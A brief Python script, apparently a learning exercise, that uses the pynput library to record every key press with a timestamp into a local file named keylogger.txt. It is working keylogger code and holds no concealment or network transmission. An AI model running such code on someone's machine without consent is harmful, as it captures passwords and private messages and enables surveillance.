#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# author: bigfoolliu


"""
监听键盘的输入并将其输出
"""
from pynput.keyboard import Listener
import logging


file_path = "./key_input/"

logging.basicConfig(filename=(file_path + "keylogger.txt"), format="%(asctime)s:%(message)s", level=logging.DEBUG)


def press(key):
    logging.info(key)


with Listener(on_press=press) as listener:
    listener.join()
